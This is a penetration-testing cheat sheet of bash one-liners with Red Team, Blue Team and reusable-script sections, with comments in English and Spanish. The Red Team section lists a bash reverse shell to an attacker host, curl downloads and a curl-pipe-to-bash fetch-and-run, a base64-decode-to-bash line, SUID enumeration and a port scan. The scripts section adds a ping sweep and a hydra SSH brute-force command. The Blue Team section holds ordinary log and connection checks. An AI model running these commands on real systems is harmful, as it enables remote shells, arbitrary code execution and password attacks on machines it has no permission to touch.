---
title: Bash One-liners
phase: oneliners
platform: linux
tags: [bash, one-liner, scripting]
risk: low
attack_tactic: NA
attack_technique: NA
data_sources: []
last_review: 2026-05-25
---

# Bash One-liners

### Red Team

```bash
# Reverse shell bash
bash -i >& /dev/tcp/attacker/port 0>&1

# File transfer via curl
curl -o output.txt http://attacker.com/file.txt

# Download and execute
curl http://attacker.com/script.sh | bash

# Port scan rápido (TCP)
for port in 22 80 443 445 3306 8080; do (echo >/dev/tcp/host/$port) 2>/dev/null && echo "Port $port open"; done

# enumerate files with SUID
find / -perm -4000 -type f 2>/dev/null

# enumerate world-writable files
find / -writable -type f 2>/dev/null | head -20

# resolve hostname
dig +short target.com

# base64 encode payload
echo "command" | base64

# decode and pipe to bash
echo "base64" | base64 -d | bash
```

### Blue Team

```bash
# Ver conexiones activas
ss -tulpn

# Ver procesos por puerto
lsof -i :443

# Análisis de logs
tail -f /var/log/auth.log | grep -i failed

# encontrar archivos modificados recently
find / -mtime -1 -type f 2>/dev/null

# extraer IPs únicas de log
cat /var/log/access.log | awk '{print $1}' | sort -u

# Counting by status code
awk '{print $9}' access.log | sort | uniq -c | sort -rn
```

### Scripts reutilizables

```bash
# loop para múltiples hosts
for host in 10.0.0.{1..254}; do echo "$host"; done

# Ping sweep
for i in {1..254}; do ping -c 1 -W 1 10.0.0.$i &>/dev/null && echo "10.0.0.$i is up"; done

# Brute force SSH con hydra
hydra -l admin -P wordlist.txt ssh://target.com
```
